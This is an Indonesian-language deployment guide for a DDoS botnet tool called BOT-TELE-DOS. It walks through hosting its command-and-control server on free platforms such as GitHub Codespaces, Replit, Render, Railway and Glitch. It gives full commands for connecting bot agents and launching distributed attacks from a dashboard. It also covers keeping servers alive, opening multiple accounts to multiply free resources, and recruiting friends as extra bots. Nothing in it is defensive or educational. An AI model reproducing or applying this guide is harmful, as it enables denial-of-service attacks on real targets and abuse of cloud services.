# 🚀 Deploy C2 Gratis Tanpa VPS

## 🎯 Platform Gratis yang Bisa Dipakai

1. **GitHub Codespaces** ⭐ (Recommended)
2. **Replit** 
3. **Render**
4. **Railway**
5. **Glitch**

---

## 1️⃣ GitHub Codespaces (RECOMMENDED)

### Keuntungan:
- ✅ 60 jam gratis per bulan
- ✅ 2 core CPU, 4GB RAM
- ✅ Port forwarding otomatis
- ✅ Akses SSH
- ✅ Persistent storage

### Setup:

#### A. Create Codespace

1. Buka repo GitHub kamu: https://github.com/AryzXploit/BOT-TELE-DOS
2. Click tombol hijau **"Code"**
3. Pilih tab **"Codespaces"**
4. Click **"Create codespace on main"**
5. Wait 1-2 menit sampai environment ready

#### B. Start C2 Server di Codespace

```bash
# Install dependencies (otomatis)
npm install

# Start C2 Server
npm run c2-server
```

#### C. Access Dashboard

Codespaces akan otomatis forward port 8080. Klik notifikasi "Open in Browser" atau:

1. Go to **PORTS** tab di terminal
2. Find port `8080`
3. Click **globe icon** untuk open in browser
4. URL format: `https://xxx-8080.preview.app.github.dev`

#### D. Get Public URL

```bash
# Di Codespace terminal
echo "Your C2 URL: https://$CODESPACE_NAME-8080.preview.app.github.dev"
```

Copy URL ini untuk connect bot agents.

#### E. Start Bot Agent (Local atau Codespace Lain)

```bash
# Ganti dengan URL C2 kamu
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev
```

### Keep Alive

Codespace akan sleep setelah 30 menit idle. Untuk keep alive:

```bash
# Install PM2
npm install -g pm2

# Start dengan PM2
pm2 start index.js --name c2-server -- c2-server -p 8080
pm2 logs
```

---

## 2️⃣ Replit

### Setup:

1. **Import dari GitHub:**
   - Go to https://replit.com
   - Click **"Create Repl"**
   - Select **"Import from GitHub"**
   - Paste: `https://github.com/AryzXploit/BOT-TELE-DOS`

2. **Configure Replit:**

Create `.replit` file:
```toml
run = "npm run c2-server"
language = "nodejs"

[nix]
channel = "stable-22_11"

[deployment]
run = ["npm", "run", "c2-server"]
deploymentTarget = "cloudrun"
```

3. **Start Server:**
```bash
npm install
npm run c2-server
```

4. **Get Public URL:**
   - Replit akan auto-generate URL
   - Format: `https://your-repl-name.your-username.repl.co`

5. **Connect Bot:**
```bash
node index.js c2-agent --c2-url https://your-repl-name.your-username.repl.co
```

### Keep Alive (Replit)

Create `keep-alive.js`:
```javascript
import express from 'express';
const app = express();

app.get('/', (req, res) => res.send('C2 Server is alive!'));
app.listen(3000);

// Import C2 server
import('./index.js');
```

Use UptimeRobot untuk ping setiap 5 menit: https://uptimerobot.com

---

## 3️⃣ Render

### Setup:

1. **Create Account:** https://render.com

2. **Create Web Service:**
   - Click **"New +"** → **"Web Service"**
   - Connect GitHub repo
   - Settings:
     - **Name:** `aryzz-c2-server`
     - **Environment:** `Node`
     - **Build Command:** `npm install`
     - **Start Command:** `npm run c2-server`
     - **Plan:** `Free`

3. **Environment Variables:**
```
PORT=8080
API_KEY=your-secret-key
```

4. **Deploy:**
   - Click **"Create Web Service"**
   - Wait 5-10 menit
   - Get URL: `https://aryzz-c2-server.onrender.com`

5. **Connect Bot:**
```bash
node index.js c2-agent --c2-url https://aryzz-c2-server.onrender.com
```

### Note:
- Free tier akan sleep setelah 15 menit idle
- Cold start butuh 30-60 detik

---

## 4️⃣ Railway

### Setup:

1. **Create Account:** https://railway.app

2. **Deploy from GitHub:**
   - Click **"New Project"**
   - Select **"Deploy from GitHub repo"**
   - Choose `BOT-TELE-DOS`

3. **Configure:**
   - Railway auto-detect Node.js
   - Add start command: `npm run c2-server`

4. **Generate Domain:**
   - Go to **Settings** → **Networking**
   - Click **"Generate Domain"**
   - Get URL: `https://xxx.up.railway.app`

5. **Environment Variables:**
```
PORT=8080
API_KEY=your-secret-key
NODE_ENV=production
```

6. **Connect Bot:**
```bash
node index.js c2-agent --c2-url https://xxx.up.railway.app
```

---

## 5️⃣ Glitch

### Setup:

1. **Import Project:** https://glitch.com
   - Click **"New Project"** → **"Import from GitHub"**
   - Paste repo URL

2. **Edit `package.json`:**
```json
{
  "scripts": {
    "start": "node index.js c2-server -p 3000"
  }
}
```

3. **Get URL:**
   - Format: `https://your-project.glitch.me`

4. **Connect Bot:**
```bash
node index.js c2-agent --c2-url https://your-project.glitch.me
```

---

## 🎯 Recommended Setup (No VPS)

### Architecture:

```
┌─────────────────────────┐
│  GitHub Codespace #1    │
│  (C2 Server)            │
│  Port: 8080             │
│  URL: xxx.preview...    │
└───────────┬─────────────┘
            │
    ┌───────┴────────┐
    │                │
┌───▼──────────┐  ┌──▼──────────┐
│ Codespace #2 │  │ Local PC    │
│ (Bot Agent)  │  │ (Bot Agent) │
└──────────────┘  └─────────────┘
```

### Step-by-Step:

**1. Setup C2 Server (Codespace #1):**
```bash
# Create codespace dari repo
# Di terminal:
npm install
npm run c2-server

# Get URL dari PORTS tab
# Copy URL: https://xxx-8080.preview.app.github.dev
```

**2. Setup Bot Agent (Codespace #2):**
```bash
# Create codespace baru (atau fork repo)
npm install

# Connect ke C2 server
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev
```

**3. Setup Bot Agent (Local PC):**
```bash
# Di komputer kamu
git clone https://github.com/AryzXploit/BOT-TELE-DOS
cd BOT-TELE-DOS
npm install

# Connect ke C2 server
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev
```

**4. Access Dashboard:**
```
Open: https://xxx-8080.preview.app.github.dev/dashboard
```

**5. Launch Attack:**
- Go to Control Panel tab
- Fill target, method, threads
- Click "Launch Attack"
- Attack akan distributed ke semua connected bots!

---

## 🔧 Configuration untuk Cloud Deploy

Create `config.cloud.json`:
```json
{
  "c2": {
    "server": {
      "port": 8080,
      "host": "0.0.0.0",
      "apiKey": "change-this-secret-key"
    },
    "agent": {
      "reconnectInterval": 10000,
      "heartbeatInterval": 60000
    }
  },
  "attack_defaults": {
    "max_threads": 500,
    "max_duration": 300,
    "default_threads": 100,
    "default_duration": 60
  }
}
```

---

## 🎮 Quick Commands

### Start C2 Server (Cloud)
```bash
# GitHub Codespaces
npm run c2-server

# Replit
npm run c2-server

# Render (auto-start)
# Railway (auto-start)
```

### Connect Bot Agent
```bash
# From anywhere
node index.js c2-agent --c2-url https://your-c2-url.com

# Multiple bots
node index.js c2-agent --c2-url https://your-c2-url.com &
node index.js c2-agent --c2-url https://your-c2-url.com &
node index.js c2-agent --c2-url https://your-c2-url.com &
```

### Test Connection
```bash
# Health check
curl https://your-c2-url.com/api/health

# List bots
curl -H "X-API-Key: your-key" https://your-c2-url.com/api/bots
```

---

## 💡 Tips & Tricks

### 1. Multiple Free Accounts
- Buat multiple GitHub accounts untuk lebih banyak Codespaces
- Setiap account dapat 60 jam/bulan gratis

### 2. Keep Server Alive
```bash
# Install PM2
npm install -g pm2

# Start with PM2
pm2 start index.js --name c2 -- c2-server
pm2 startup
pm2 save

# Auto-restart on crash
pm2 restart c2
```

### 3. Use UptimeRobot
- Sign up: https://uptimerobot.com
- Add monitor untuk ping C2 URL setiap 5 menit
- Prevent sleep/idle

### 4. Cloudflare Tunnel (Advanced)
```bash
# Install cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64

# Create tunnel
./cloudflared-linux-amd64 tunnel --url http://localhost:8080
```

### 5. Ngrok (Quick Test)
```bash
# Install ngrok
npm install -g ngrok

# Start C2 server
npm run c2-server &

# Expose with ngrok
ngrok http 8080

# Get public URL: https://xxx.ngrok.io
```

---

## 🔒 Security Tips

1. **Change API Key:**
```bash
node index.js c2-server --api-key "$(openssl rand -hex 32)"
```

2. **Use Environment Variables:**
```bash
export C2_API_KEY="your-secret-key"
export C2_PORT="8080"
```

3. **Enable HTTPS:**
   - GitHub Codespaces: Auto HTTPS ✅
   - Replit: Auto HTTPS ✅
   - Render: Auto HTTPS ✅
   - Railway: Auto HTTPS ✅

4. **Whitelist IPs (Optional):**
Edit `src/c2/middleware/auth.js` untuk add IP whitelist.

---

## 📊 Resource Limits

| Platform | CPU | RAM | Storage | Bandwidth | Uptime |
|----------|-----|-----|---------|-----------|--------|
| **GitHub Codespaces** | 2 core | 4GB | 32GB | Unlimited | 60h/month |
| **Replit** | 0.5 core | 512MB | 1GB | Limited | Always on (paid) |
| **Render** | Shared | 512MB | - | 100GB/month | 15min idle |
| **Railway** | Shared | 512MB | 1GB | 100GB/month | Always on |
| **Glitch** | Shared | 512MB | 200MB | Limited | 5min idle |

---

## 🎯 Best Setup (Gratis)

**Recommendation:**

1. **C2 Server:** GitHub Codespaces (60 jam gratis)
2. **Bot Agents:** 
   - Local PC (unlimited)
   - GitHub Codespaces lain (fork repo)
   - Teman-teman yang mau join (distributed)

**Total Cost:** $0 💰

---

## 📞 Support

Butuh bantuan? Contact:
- GitHub: https://github.com/AryzXploit
- Telegram: @AryzzXploit

---

**Developed by Aryzz-Dev** 🔥
**Deploy anywhere, attack everywhere!** 🚀
